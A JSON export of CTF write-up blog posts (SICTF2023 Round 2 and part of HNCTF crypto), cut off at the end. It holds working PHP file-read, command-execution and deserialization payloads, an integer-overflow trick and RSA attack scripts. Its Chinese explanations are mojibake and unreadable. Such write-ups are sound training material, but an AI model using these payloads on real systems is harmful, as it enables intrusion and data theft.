[{"id":"c81b9f44256e6ddd489a894823467611","title":"SICTF2023","content":"SICTF2023 #Round2[ç­¾åˆ°]Includeç›´æ¥phpä¼ªåè®®è¯»\nshell?SICTF=php://filter/read=convert.base64-encode/resource=/flag\n#SICTF&#123;6c96f3cd-4a0a-41af-979f-e617f8c274dd&#125;Baby_PHPç”¨%0aç»•è¿‡ï¼Œbase64ç¼–ç å‘½ä»¤æ‰§è¡Œï¼Œflagåœ¨æ³¨é‡Š\nshellget\n?k%20e%20y=123%0a\npost \ncommand=system(base64_decode(Y2F0IGZsYWcucGhw));\n#SICTF&#123;4d0d4936-ce21-4c2f-a049-1f2984602bb0&#125;RCEshell&lt;?php\nerror_reporting(0);\nhighlight_file(__FILE__);\n$code = $_POST[&#39;code&#39;];\n$code = str_replace(&quot;(&quot;,&quot;hacker&quot;,$code);\n$code = str_replace(&quot;.&quot;,&quot;hacker&quot;,$code);\neval($code);\n?&gt;æ ¹æ®ä»£ç å‘ç°ï¼ˆè¢«è¿‡æ»¤ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨system()å‡½æ•°ï¼Œä½¿ç”¨echoè¿›è¡Œrceï¼Œå‘ç°.ä¹Ÿè¢«è¿‡æ»¤ï¼Œç›´æ¥é€šé…ç¬¦\nshellcode=echo `cat /f*`;\n#SICTF&#123;62edaaf5-f176-4dd7-9eea-64f4b700cc4f&#125; #!/bin/bash echo $FLAG &gt; /flag export FLAG=not_flag FLAG=not_flag rm -f /flag.shæˆ‘å…¨éƒ½è¦shell&lt;?php\nhighlight_file(__FILE__);\n\nclass B&#123;\n    public $pop;\n    public $i;\n    public $nogame;\n\n    public function __destruct()\n    &#123;\n        if(preg_match(&quot;/233333333/&quot;,$this-&gt;pop))&#123;\n            echo &quot;è¿™æ˜¯ä¸€é“ç­¾åˆ°é¢˜ï¼Œä¸èƒ½è®©æ–°ç”Ÿä¸€ç›´åšä¸å‡ºæ¥é­å—æ‰“å‡»&quot;;\n        &#125;\n    &#125;\n\n    public function game()&#123;\n        echo &quot;æ‰£1é€åœ°ç‹±ç«&quot;;\n        if ($this-&gt;i = &quot;1&quot;)&#123;\n            echo &#39;&lt;img src=\\&#39;R.jpg\\&#39;&gt;&#39;;\n            $this-&gt;nogame-&gt;love();\n        &#125;\n    &#125;\n\n    public function __clone()&#123;\n        echo &quot;å¿…é¡»æ‰§è¡Œ&quot;;\n        eval($_POST[&quot;cmd&quot;]);\n    &#125;\n&#125;\n\n\nclass A&#123;\n    public $Aec;\n    public $girl;\n    public $boy;\n\n    public function __toString()\n    &#123;\n        echo &quot;I also want to fall in love&quot;;\n        if($this-&gt;girl != $this-&gt;boy &amp;&amp; md5($this-&gt;girl) == md5($this-&gt;boy))&#123;\n            $this-&gt;Aec-&gt;game();\n        &#125;\n    &#125;\n\n\n&#125;\n\n\nclass P&#123;\n    public $MyLover;\n    public function __call($name, $arguments)\n    &#123;\n        echo &quot;æœ‰å¯¹è±¡æˆ‘ä¼šåœ¨è¿™æ‰“CTF???çœ‹æˆ‘å…‹éš†ä¸€ä¸ªå¯¹è±¡ï¼&quot;;\n        if ($name != &quot;game&quot;) &#123;\n            echo &quot;æ‰“æ¸¸æˆå»ï¼Œåˆ«æƒ³ç€å¯¹è±¡äº†&quot;;\n            $this-&gt;MyLover = clone new B;\n        &#125;\n    &#125;\n\n\n&#125;\n\n\nif ($_GET[&quot;A_B_C&quot;])&#123;\n    $poc=$_GET[&quot;A_B_C&quot;];\n    unserialize($poc);\n&#125;æ ¹æ®ä»£ç å‘ç°å°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„ååºåˆ—åŒ–ï¼Œç›´æ¥æ„é€ \nshell$b=new B();\n$b-&gt;i=1;\n$p=new P();\n$b-&gt;nogame=$p;\n$a=new A();\n$a-&gt;girl=&#39;QNKCDZO&#39;;\n$a-&gt;boy=&#39;240610708&#39;;\n$a-&gt;Aec=$b;\n$b-&gt;pop=$a;\necho serialize($b);\n#SICTF&#123;1d4fb730-79f1-4b0a-a970-1a4634e364ee&#125;misc[ç­¾åˆ°]WelcomeshellSICTF&#123;Welcome_to_SICTF2023_#Round2&#125;é—®å·è°ƒæŸ¥shellSICTF&#123;SICTF_Round3_will_do_even_better!&#125;fast_morseä¸€çœ¼morse\nshell..-. ..--- .- ----- ----. -... ..-. -....- --... ..-. ....- .- -....- ....- ..--- -.... ----. -....- ----. ...-- .- ..... -....- -.-. ---.. .- ....- ---.. ...-- -.... ----- -... ----- ...-- -.-. \n#SICTF&#123;f2a09bf-7f4a-4269-93a5-c8a48360b03c&#125;baby_zipæ˜æ–‡æ”»å‡»ï¼Œçœ‹ä»–åŠ å¯†ç®—æ³•ï¼Œzipcryptoï¼Œé€ ä¸ªå¤´æ‰“\nåœ¨flag.pngçš„å°¾å·´æ˜¯flag\ncrypto[ç­¾åˆ°]å¤å…¸å¤§æ‚çƒ©shellğŸ©ğŸ‘ƒğŸªğŸ¼ğŸ‘…ğŸ¯ğŸ©ğŸ‘ˆğŸ‘‡ğŸ‘­ğŸ‘ŸğŸ‘ğŸºğŸ­ğŸ‘‰ğŸ‘™ğŸ‘¤ğŸ‘‹ğŸ‘šğŸªğŸ«ğŸ‘ğŸ‘¢ğŸ‘®ğŸ‘±ğŸ¼ğŸ‘¢ğŸ‘¨ğŸ‘ ğŸ‘­ğŸ½ğŸ°ğŸ»ğŸ‘šğŸ‘‚ğŸ‘§ğŸ‘ ğŸ‘¥ğŸ‘›ğŸ‘®ğŸ‘¯ğŸ‘®ğŸ‘¬ğŸ¾ğŸ‘ğŸ‘›ğŸ‘ŒğŸ‘šğŸ‘ğŸ¨ğŸ‘ğŸ‘‰ğŸ‘†ğŸ¿ğŸ‘†ğŸ‘˜ğŸ‘‡ğŸºğŸ‘¦ğŸ¸ğŸ‘ƒğŸ­ğŸ‘ŸğŸ‘‘ğŸ‘ªğŸ‘ƒğŸ‘ğŸ»ğŸ»ğŸ‘œğŸ§ğŸ‘‡ğŸ‘ŠğŸ§ğŸ¾ğŸ¼ğŸ‘‡ğŸ«ğŸºğŸ‘ğŸ‘†ğŸ‘ªğŸ¼ğŸ‘‹ğŸ‘ŒğŸ‘§ğŸ»ğŸ‘ğŸ©ğŸºğŸ‘¥ğŸ½ğŸ‘‹ğŸ‘‰ğŸ°ğŸ‘ğŸ‘ ğŸ‘ ğŸ‘£ğŸ§ğŸ«ğŸ‘§ğŸ­ğŸ‘¢ğŸ¯ğŸ‘‘ğŸ‘‘ğŸ®ğŸ‘‚ğŸ‘ğŸ»ğŸ‘¥ğŸ‘šğŸ®ğŸ‘‹ğŸ‘¬ğŸ‘ŒğŸ‘¥ğŸ‘ğŸ‘£ğŸ‘…ğŸ‘§ğŸ‘¯ğŸ‘¦ğŸ‘ŒğŸ‘ŒğŸ‘ğŸ‘ ğŸ‘ŒğŸ½ğŸ‘‰ğŸ‘ƒğŸ‘ŠğŸ«ğŸ‘‰ğŸ¨ğŸ®ğŸ‘©ğŸ‘†ğŸªğŸ¯ğŸ‘˜ğŸ‘ğŸ‘ğŸ¼ğŸ‘©ğŸ‘ğŸ‘ŠğŸ‘ğŸ‘¡ğŸ‘€ğŸ‘°ğŸ‘‹ğŸ‘£ğŸ‘¨ğŸ‘§ğŸ‘ğŸ‘œğŸ‘ğŸ‘›ğŸ®ğŸ‘˜ğŸ‘…ğŸ‘ ğŸ¿ğŸ‘‚ğŸ‘°ğŸ‘„ğŸ‘ˆğŸ‘ğŸ‘ ğŸ‘¤ğŸ‘ƒğŸ‘›ğŸ‘˜ğŸ­ğŸ‘…ğŸ‘±ğŸ‘†ğŸ‘¬ğŸ‘«ğŸ‘¥ğŸ‘†ğŸ½ğŸ‘ğŸ‘ğŸ‘¥ğŸ‘ŠğŸ‘‡ğŸ‘‰ğŸ‘ŠğŸ‘©ğŸ‘ŒğŸ‘­ğŸ«ğŸ«ğŸ‘¬ğŸ‘±ğŸ¯ğŸ‘‡ğŸºğŸ‘ğŸ‘ğŸ‘‘ğŸ‘™ğŸ®ğŸ‘œğŸ‘‹ğŸ‘˜ğŸ‘ªğŸ‘©ğŸ‘šğŸ‘¦ğŸ‘¨ğŸ‘€ğŸ‘©ğŸ‘ğŸ‘‰ğŸ‘ƒğŸ¾ğŸ‘¥ğŸ‘€ğŸ«ğŸ‘ğŸ‘ğŸ©ğŸ§ğŸ‘°ğŸ‘†ğŸ‘‡ğŸ‘¨ğŸªğŸ‘ƒğŸ­ğŸ‘¦ğŸ«ğŸ‘±è§£base100\nshell2L3EN82QPvhfC6RbmTc34VkwzEkqivF9DcKpindwxwuGYdUcg1XROHOaPCoAL6hZsLJDDe0PS0GEP4CYOsETUpDY2CnFTR9Wiil04p6k8ZZ7KXDnc7TuUnJlNpxoUUViUFRLS4R17rO38aXXErVSVjIyTlqpVeYd7aNiHKyMQfimLda6NzOutnOFJYnSPRSrUv44uz8PCJgZb7eTasrcoqIrYRLGnI4fV20yOPq3L6o4zä½¿ç”¨cipheyæ¢­\nshellPossible plaintext: &#39;SICTF&#123;fe853b49-8730-462e-86f5-fc8e9789f077&#125;&#39; (y/N):Radiorsaçš„å¹¿æ’­æ”»å‡»\npythonimport libnum\nfrom gmpy2 import invert, gcd, iroot\n\ndef op(x):\n    res = 1\n    for i in x:\n        res *= i\n    return res\n\ndef CRT(m, a):\n    assert (len(m) == len(a))\n    M = op(m)\n    sum = 0\n    for m, a in zip(m, a):\n        Mi = M // m\n        ti = invert(Mi, m)\n        sum += a * ti * Mi\n    return sum % M\ndef GCRT(m, a):\n    assert (len(m) == len(a))\n    curm, cura = m[0], a[0]\n    for m, a in zip(m[1:], a[1:]):\n        d = gcd(curm, m)\n        c = a - cura\n        assert (c % d == 0)\n        K = c // d * invert(curm // d, m // d)\n        cura += curm * K\n        curm = curm * m // d\n    return cura % curm\n\nn1 = 14628911682936716611458501697007036859460044243525290515096052103585430459755335375005202100114469571371360084664887335211277585652711111523095037589648375630146039444071400098427638768750755153219974194380355807078158427824557754939604018020265955042573660474772006646525311705184431094905718137297923127124517126579859336516891364853724635334011666814712424599592662398013241607855160919361308195967978220182785816761656927836373944699635667244275310680450562446433724968942835275279255823144471582249379035668825437133182865600026935116686574740844588839352146024513673500770611055698030333734066230166111140083923\nn2 = 16756694748293603983474688536179571665757862433174984877308316444468003022266277794769268134195205510197588585566270416339902269736376811449830775290335951504698137924773942880807921752691668522662285163130340474205633998154849689387759453003838730282756734975490180702422176361373516245372635401939755527017589503572550811648345570775428936487145892225736625411540461653083957762795820510109891180906709827194217045059033312564525916136573856999724346161896146703174418039344166251503310869772735585554127509732135494936119159784702673291794381095696332128950979288440758815310482211285712819274848744478643590996499\nn3 = 12023158079717019193506148537498877243668782424904061914991928068483879707115315968983829360560644394409575645736275352836086080024994045582242629571839276759393418303915955798990522990081795218822313146157773272844272865701134880180795342597049645358985187689813369428579614193015028249821853347208001645148169449968882591709833452960545988520048722323580338213590245476892223967673180144525106292453573842357322398199104132677638909964034937501684668442732786408572501007756270725934445316827054687741612177409932320532825182104820899546084015733164816993674100635828218335112393003462442685677115798304835391938681\nc1 = 786426913645332991929803636719878643130489430090701482974255190570111407517277263761161970232982615374753982050075781017755721714929721429185828101898786972242994012456972241276851428750970754773002966788642795040933520662931514953660571657013642671173456750800960592586345219252277575624120271330470724245201080094330964145796872211627254805407394764183615099525852600855622089361965086460279057625205099471122036599934609091062009161119885692567925924978687256063116915630947838112126347748759078024890458539541208153526564434483654508834147071166870006117573542198238493913144419569943131642262575848786399020602\nc2 = 14269311999815379511888097227418748728398011595172649708273598243317106830139061994801598925448165045032084910971094414749744701731066555194159863759072739031915833091715422787808666326235589236328864675164322734119047182014621724868200908222400504845559290620275973427127376594365043386362821355037781568524903149101953873768462097165128186788759111090267131443645126715520994688945363059795513931799317608292977574376954729552861360597103229877031117089231816770880909815561950691603994439997197261395452797893557057320175747162837857668062550646101714062365530246698404923128445182100334335447738834779014705114350\nc3 = 3204718091370324153305164801961074660508922478706979436653573192321723216725523523538914956544950802616295043619768261075799875855502834749045520466140056621489305006966280527055668378303630674311102581232313032585389907028715671091914904062961720585667564982641321454541632782484415075257140508738041786400512095949826279576159569786734978545737717138115729502475357594151593143140355121154223614868465202149338507796306863351134218879326031985027900678671697876083351974546516576983143592764763925335805465720148057651958521255276602933604064541840892578409973858867533575728482926007556060584654853884046046420855\ne=17\nn =  [\n n1\n,n2\n,n3\n]\nc =  [c1,c2,c3]\n\nm = CRT(n, c)\nm1 = iroot(m, e)  # å¼€eæ¬¡æ–¹\nprint(m1)\nprint(libnum.n2s(int(m1[0])))\n#SICTF&#123;fdc0afb5-1c81-46b9-a28a-241f5f64419d&#125;MingTianPaoè¿™é¢˜åŠ å¯†çš„æ˜æ–‡å…¶å®æ˜¯å°çº¢å¸½çš„æ•…äº‹ï¼Œæˆ‘ä¸€æ­¥æ­¥åˆ†ææ˜æ–‡çš„å¯èƒ½æ€§ï¼Œæœ€åç¡®å®šæ˜¯å°çº¢å¸½ï¼Œä¸€ä¸ªä¸ªçˆ†ç ´è¯•é”™\nç„¶åè§£å¯†å‡ºæ¥\npythonfrom Crypto.Util.number import *\nfrom gmpy2 import *\nfrom Crypto.Util.strxor import strxor\nn=[0x1f2037202a1e6d06353b61263d050a0538493b3018544e14171d2b1c4218\n,0x3769373b66142f31297f291126410e042b01162d59103a0c005221075013\n,0x37242c202e1e3f743c36371130410c1e2b491a31574406014505291a550e\n,0x7f6922742e1a213270372e01264105193004532b1f554e120c1e2a145618\n,0x7d69143c23156d18392b35183141310e3b49213613590003453a291a555d\n,0x36273731341e297424372454230e0c0f2c49127f005f020245112718545d\n,0x26396320295b2531227161273c04430f360d533118444e0f0b1d31554615\n,0x323d6335660c24373b3a2554350f0a063e05533712101905165e66145f19\n,0x733e222766152220703e27063508074b300f53371e5d40444735291a555d\n,0x37283a7432146d2d3f2a6d541808171f330c530d12544e360c162f1b565d]\nflag=&#39;SICTF&#123;MTP_AtTack_is_w0nderFu1&#125;&#39;\n#SICTF&#123;MTP_AtTack_is_w0      Fu1&#125;\nm=&#39;abcdefghijklmnopqrstuvwsyzABCDEFGHIJKLMNOPQRSTUVWSYZ-_&lt;&gt;&#39;\nprint(len(flag))\nprint(long_to_bytes(bytes_to_long(b&#39;SICTF&#123;MTP_AtTack_is_w0nderFu1&#125;&#39;)^bytes_to_long(long_to_bytes(n[0]))))\n&quot;&quot;&quot;for j in m:\n    flag1 = (flag +j).encode()\n    for  i in range(0,10):\n        n1=long_to_bytes(n[i])\n        print(long_to_bytes(bytes_to_long(flag1) ^ bytes_to_long(n1[0:25])))\n    print(j)\n    print(&#39;-------------------------&#39;)\n&quot;&quot;&quot;\nflag1=&#39;Fu1&#125;&#39;\n\n&quot;&quot;&quot;\nb&#39;Little Red Riding Hood &#39;\nb&#39;d to obey her mother. T&#39;\nb&#39;dmother lived out in th&#39;\nb&#39;, a half hour from the &#39;\nb&#39;. When Little Red Ridin&#39;\nb&#39;entered the woods a wol&#39;\nb&#39;up to her. She did not &#39;\nb&#39;at a wicked animal he w&#39;\nb&#39; was not afraid of him.&#39;\nb&#39;day to you, Little Red &#39;\n\nåŸºæœ¬ä¸Šé çŒœ\nEasy_CopperSmithpçš„é«˜ä½æ”»å‡»\npythondef p_high_attack(p_high,n,x_bits):\n    &quot;&quot;&quot;x_bits:è¡¨æ˜æœªçŸ¥çš„pä½ä½&quot;&quot;&quot;\n    P = PolynomialRing(Zmod(n),names=(&#39;x&#39;,),implementation=&#39;NTL&#39;)\n    (x,) = P._first_ngens(1)\n    f = p_high + x\n    f = f.monic()\n    res = f.small_roots(X=2**x_bits,beta=RR(log(p_high,n)),epsilon=0.02)\n    return [p_high+int(x) for x in res]\nn=114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381\np_high=6833525680083767201563383553257365403889275861180069149272377788671845720921410137177\nc=87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810\nprint(p_high_attack(p_high&lt;&lt;230,n,230))å¾—åˆ°p\nç„¶årsaè§£å¯†\npythonn=114007680041157617250208809154392208683967639953423906669116998085115503737001019559692895227927818755160444076128820965038044269092587109196557720941716578025622244634385547194563001079609897387390680250570961313174656874665690193604984942452581886657386063927035039087208310041149977622001887997061312418381\np=11790815224554410800121104187905468470390194289969616547114051282402254164513760262526048229096923579410713190006883604069013303904509383122210101811900773\nq=n//p\ne=65537\nd=invert(e,(p-1)*(q-1))\nc=87627846271126693177889082381507430884663777705438987267317070845965070209704910716182088690758208915234427170455157948022843849997441546596567189456637997191173043345521331111329110083529853409188141263211030032553825858341099759209550785745319223409181813931086979471131074015406202979668575990074985441810\nprint(long_to_bytes(pow(c,d,n)))ç­¾åˆ°é¢˜æ¥å’¯ç›¸å…³ä¿¡æ¯æ”»å‡»\npythonfrom Crypto.Util.number import *\nfrom gmpy2 import *\nimport binascii\ndef attack(c1, c2, n, e):\n    PR.&lt;x&gt;=PolynomialRing(Zmod(n))\n    # replace a,b,c,d\n    g1 = (114*x+2333)^e - c1\n    g2 = (514*x+4555)^e - c2\n\n    def gcd(g1, g2):\n        while g2:\n            g1, g2 = g2, g1 % g2\n        return g1.monic()\n    return -gcd(g1, g2)[0]\ne=[]\nn = 18993579800590288733556762316465854395650778003397512624355925069287661487515652428099677335464809283955351330659278915073219733930542167360381688856732762552737791137784222098296804826261681852699742456526979985201331982720936091963830799430264680941164508709453794113576607749669278887105809727027129736803614327631979056934906547015919204770702496676692691248702461766117271815398943842909579917102217310779431999448597899109808086655029624478062317317442297276087073653945439820988375066353157221370129064423613949039895822016206336117081475698987326594199181180346821431242733826487765566154350269651592993856883\nc1 = 3089900890429368903963127778258893993015616003863275300568951378177309984878857933740319974151823410060583527905656182419531008417050246901514691111335764182779077027419410717272164998075313101695833565450587029584857433998627248705518025411896438130004108810308599666206694770859843696952378804678690327442746359836105117371144846629293505396610982407985241783168161504309420302314102538231774470927864959064261347913286659384383565379900391857812482728653358741387072374314243068833590379370244368317200796927931678203916569721211768082289529948017340699194622234734381555103898784827642197721866114583358940604520\nc2 = 6062491672599671503583327431533992487890060173533816222838721749216161789662841049274959778509684968479022417053571624473283543736981267659104310293237792925201009775193492423025040929132360886500863823523629213703533794348606076463773478200331006341206053010168741302440409050344170767489936681627020501853981450212305108039373119567034948781143698613084550376070802084805644270376620484786155554275798939105737707005991882264123315436368611647275530607811665999620394422672764116158492214128572456571553281799359243174598812137554860109807481900330449364878168308833006964726761878461761560543284533578701661413931\n\nfor i in range(2**9,2**10):\n    if isPrime(i):\n        e.append(i)\nfor i in e:\n    m=long_to_bytes(int(attack(c1, c2, n, i)))\n    print(i)\n    if b&#39;SICTF&#39; in m:\n        print(m)\n        breaksmall_emçš„é«˜ä½æ”»å‡»\npython#Sage\nn= 23407088262641313744603678186127228163189328033499381357614318160776774708961658114505773173784501557046914457908828086210961235530240151825359345210845219656000760996670856300710703016947799649686427460688236465568188205550456293373157997725204643414082796492333552579250010906010553831060540937802882205118399938918764313169385349293602085310111289583058965780887097301702677087443291977479125263301000328313103296364864396361278863921717374909215078711198899810620522933994481419395021233240234478331179727351050575360886334237633420906629984625441302945112631166021776379103081857393866576659121443879590011160797\ne= 3\nc= 1584727211980974717747362694412040878682966138197627512650829607105625096823456063149392973232737929737200028676411430124019573130595696272668927725536797627059576270068695792221537212669276826952363636924278717182163166234322320044764324434683614360641636360301452618063418349310497430566465329766916213742181\n\nmbar = 11658736990073967239197168945911788935424691658202162501032766529463315401599017877851823976178979438592\nkbits = 60\nbeta = 1\nnbits = n.nbits()\nprint(&quot;upper &#123;&#125; bits of &#123;&#125; bits is given&quot;.format(nbits - kbits, nbits))\nPR.&lt;x&gt; = PolynomialRing(Zmod(n))\nf = (mbar + x)^e - c\nx0 = f.small_roots(X=2^kbits, beta=1)[0]  # find root &lt; 2^kbits with factor = n\nprint(&quot;m:&quot;, mbar + x0)\n\neasy_mathæ„é€ gcdæ±‚q\npythonfrom Crypto.Util.number import *\nfrom gmpy2 import *\nn = 68123067052840097285002963401518347625939222208495512245264898037784706226045178539672509359795737570458454279990340789711761542570505016930986418403583534761200927746744298082254959321108829717070206277856970403191060311901559017372393931121345743640657503994132925993800497309703877076541759570410784984067\nhint1 = 564294243979930441832363430202216879765636227726919016842676871868826273613344463155168512928428069316237289920953421495330355385445649203238665802121198919543532254290185502622234014832349396422316629991217252686524462096711723580\nhint2 = 484307144682854466149980416084532076579378210225500554261260145338511061452958092407101769145891750844383042274498826787696953308289632616886162073232218214504005935332891893378072083589751354946391146889055039887781077066257013110\nc = 57751903193610662622957432730720223801836323458721550133101805763463060486486266309568004721657732742899781400754207249733137375171400440423755473421971160000575072519031824740691618617905549725344323721903857290320737224300672847773455169809689188843070599176261204013341324705808617411345132933937680951713\nt=[]\nfor i in range(2**12,2**13):\n    if isPrime(i):\n        t.append(i)\n\nz=1\nfor i in t:\n    for j in t:\n\n        if gcd(hint2*j-hint1*i,n)!=1:\n            print(gcd(hint2*j-hint1*i,n))\nq=8358483529150257619757085065272214074629139403939506404958882156637928949429486966229697771519458532207667137987443291952917150640467328461391364839768437\np=n//q\ne=65537\nd=invert(e,(p-1)*(q-1))\nprint(long_to_bytes(pow(c,d,n)))pwn[ç­¾åˆ°]Shopæè¿°è¯´æ˜¯intï¼Œæƒ³åˆ°æ•´å‹æº¢å‡ºï¼Œç›´æ¥ncè¿æ¥ç„¶åé€‰æ‹©è·å¾—flagï¼Œæ•°é‡ä¸º-1\nshellD:\\tools\\nc\\netcat-win32-1.12&gt;nc64.exe 210.44.151.51 10471\nWelcome to the store! You currently have 10 coins.\n\nProduct List:\n1. flag - 9999 coins\n2. hint - 10 coins\n3. quit\nPlease select a product to purchase (or enter 3 to quit): 1\nPlease enter the quantity to purchase: -1\nCongratulations! You have purchased -1 flag file(s)!\nSICTF&#123;a6231419-b711-456f-97d3-11b2510fd0c4&#125;reverse[ç­¾åˆ°]PYCåç¼–è¯‘å³å¯å¾—åˆ°flag\nshellSICTF&#123;07e278e7-9d66-4d90-88fc-8bd61e490616&#125;Myobjectç®€å•çš„rc4ï¼Œå¯¼å‡ºv18,v19,v20ï¼Œå¸¸è§„è„šæœ¬å¾—åˆ°flag\npythonimport struct\nimport binascii\n\ndef rc4(data, key):\n    S = list(range(256))\n    j = 0\n    out = []\n\n    for i in range(256):\n        j = (j + S[i] + key[i % len(key)]) % 256\n        S[i], S[j] = S[j], S[i]\n\n    i = j = 0\n    for char in data:\n        i = (i + 1) % 256\n        j = (j + S[i]) % 256\n        S[i], S[j] = S[j], S[i]\n        out.append(char ^ S[(S[i] + S[j]) % 256])\n    \n    return bytes(out)\n\nkey = b&#39;SIFLAG&#39;\na=0x47CF225A0ED32730\nhex_data=a.to_bytes(8,&#39;little&#39;)\na=0xE50B6B47\nhex_data+=a.to_bytes(4,&#39;little&#39;)\nhex_data=hex_data[:-1]\na=0x785C399BA538DE5\nhex_data+=a.to_bytes(8,&#39;little&#39;)\na=0x9F88FE10771C0107\nhex_data+=a.to_bytes(8,&#39;little&#39;)\ndata=hex_data\nencrypted = rc4(data, key)\nprint(encrypted)\n#b&#39;SICTF&#123;wow_you_get_the_flag&#125;&#39;chbaseidaå‘ç°ä¸ºbase64æ¢è¡¨\nshellimport base64\n\nstr1 = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;\nstr2 = &#39;ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz0123456789+/&#39;\na = &#39;F0lWEVA7BmUzAGB0C2UuAU9hbnIpATEidDdnACQ9&#39;\nx = base64.b64decode(a.translate(str.maketrans(str1,str2))) #ç”¨äºè¿›è¡Œä¸¤ä¸ªè¡¨çš„è½¬æ¢\nprint(x)\n#b&#39;SICTF&#123;base64_and_antidebugger&#125;&#39;ä¸ä¸€æ ·çš„base64forensicsè´­ç‰©ä¹‹æ—…æƒ³åˆ°æ ‘æœ¨åœ¨åŒ—äº¬ï¼Œç›´æ¥ç™¾åº¦æœç´¢å›¾ç‰‡ä¸­çš„å•†åœºã€‚\nshellSICTF&#123;åŒ—äº¬å¸‚_é¡ºä¹‰åŒº_æ–°é¡ºå—å¤§è¡—_åŒ—äº¬åè”é¡ºä¹‰é‡‘è¡—è´­ç‰©ä¸­å¿ƒ&#125;å¤©æ¡¥1æ—è¾¹ä¸ºå…¬äº¤è½¦2å…¬å®¶è½¦ä¸“ç”¨è½¦é“åŸå¸‚æœ‰åŒ—äº¬ï¼Œå¤©æ´¥ï¼Œè´µé˜³ï¼Œéƒ‘å·ï¼Œå¤§è¿ï¼Œæ­å·ï¼Œæµ·å£ï¼Œå—äº¬ï¼Œæ­¦æ±‰ï¼Œä¹Œé²æœ¨é½ï¼Œå¦é—¨ï¼Œè¥¿å®‰ï¼Œæ²ˆé˜³ï¼Œé“¶å·ï¼Œæ°‘å’Œï¼Œä¸Šæµ·ï¼Œæ·±åœ³3ä¸­é—´æŠ¤æ ä¸ºé‡‘è‰²4æŠ¤æ åº•åº§æœ‰å¹³è¡ŒèŠ±çº¹ï¼ŒæŸ±å¤´ä¸ºé‡‘å­—å¡”å½¢çŠ¶ï¼Œä¾§é¢å¤§å­©å­æœ‰ä¸ªåœ†å½¢æˆ–äººå½¢å›¾æ¡ˆ5åœ¨ç½‘ä¸ŠæŸ¥æ‰¾ç…§ç‰‡ä»”ç»†å¯¹æ¯”ï¼Œç¬¦åˆä¸Šè¿°æ¡ä»¶ä¸ºè¥¿å®‰å¸‚æ”¿æŠ¤æ 5ä»è¥¿å®‰å¯»æ‰¾å¹¶ä»”ç»†å¯¹æ¯”6ä»å›¾ç‰‡çœ‹å‡ºé“è·¯ä¸¤æ—æ ‘å¶å½¢çŠ¶æ¨æ–­æ ‘å¤§æ¦‚ä¸ºæ¢§æ¡æ ‘7ä»ä¸Šè¿°æ¡ä»¶æŸ¥æ‰¾å¾—å‡ºç­”æ¡ˆ\nshellSICTF&#123;é™•è¥¿çœè¥¿å®‰å¸‚ç¢‘æ—åŒºå‹è°Šè¥¿è·¯&#125;ç¾å¥³å§å§O.oç™¾åº¦è¯†å›¾ï¼ŒçƒŸå°å±±å…¬å›­\nshellSICTF&#123;ç¦å»ºçœç¦å·å¸‚ä»“å±±åŒºçƒŸå°å±±å…¬å›­&#125;å®å¡”é•‡æ²³å¦–ç™¾åº¦è¯†å›¾ä¸€çœ¼ä¸çœŸï¼Œæ‘¸åˆ°ä¸ªä¸€è¡€\nshellSICTF&#123;å±±ä¸œçœæµå®å¸‚æ±¶ä¸Šå¿å¤ªå­çµè¸ªå¡”&#125;","slug":"SICTF2023 #Round2","date":"2023-10-01T15:45:36.000Z","categories_index":"CTF","tags_index":"WP","author_index":"xmmlaz"},{"id":"d860456be5f63fa9cfc13cf6900001a3","title":"HNCTF-Crypto","content":"[Week1]baBAbaseSEsebaseå…¨å®¶æ¡¶ï¼Œbase92ï¼Œ91ï¼Œ85ï¼Œ64ï¼Œ32ï¼Œ16\nflagä¸ºNSSCTF{th3re_1s_als0_b4se_36_45_58_62_100}\n[Week1]A dictatorlzw_uswksj_uahzwj_ak_gfw_gx_lzw_egkl_tskau_udskkausd_uahzwjk\nå‡¯æ’’å¯†ç ï¼Œ18ä½åç§»\nthe_caesar_cipher_is_one_of_the_most_basic_classical_ciphers\n[Week1]littleprinceæˆ‘å€ŸåŠ©çš„åœ¨çº¿ç½‘ç«™ç»“åˆçˆ†ç ´å‡ºæ¥çš„ï¼Œæ–¹æ³•æœ‰ç‚¹ç¬¨ï¼Œä½†æ˜¯å¯ä»¥å‡ºæ¥ï¼Œåœ¨çº¿ç½‘ç«™å¯ä»¥è§„åˆ’å‡ºä»–ä»¬çš„ç›¸å…³å‡½æ•°ï¼Œç„¶åå°±å¯ä»¥ä¸€ä¸ªä¸ªçˆ†ç ´è€Œå‡º\ntxtdef enc(a,b,c):\n    return a&gt;&gt;b|(a&amp;((1&lt;&lt;b)-1))&lt;&lt;(c-b)\ndef outp(x,h):\n    p=randint(1&lt;&lt;h,1&lt;&lt;h+1)\n    q=randint(1&lt;&lt;h,1&lt;&lt;h+1)\n    c1,c2=x%p,x%q\n    print(p,q,c1,c2)\nm=bytes_to_long(flag)\nm_len=m.bit_length()\nd,h,st=32,16,32\nr=m_len%d\nassert(r&gt;h)\nwhile st&lt;=m_len:\n    x=enc(m,st,m_len)\n    x&gt;&gt;=(m_len-d)\n    outp(x,h)\n    st+=d\nm&gt;&gt;=(m_len-r)\noutp(m,h)è¿™é‡Œå…¶å®å°±æ˜¯å¯¹æ¯32ä½æ“ä½œï¼Œä¹Ÿå°±æ˜¯ä»æœ€å³è¾¹åˆ°æœ€å·¦è¾¹ï¼Œç„¶åä¸€ä¸€åŠ å¯†ï¼Œç†è§£å‡ºè¿™ä¸ªå°±å¯ä»¥è¿›è¡Œè§£å¯†ï¼Œæˆ‘æ˜¯é‡‡ç”¨çˆ†ç ´ï¼Œå…·ä½“ç®—æ³•æ²¡æœ‰åˆ†æ\nå¾—å‡ºflagä¸ºnssctf{Y0u_kn0w_one_l0ves_the_sunset_when_0ne_is_so_sad}\n[Week1]baby_rsatxtfrom Crypto.Util.number import bytes_to_long, getPrime\nfrom gmpy2 import *\nfrom secret import flag\nm = bytes_to_long(flag)\np = getPrime(128)\nq = getPrime(128)\nn = p * q\ne = 65537\nc = pow(m,e,n)\nprint(n,c)\n# 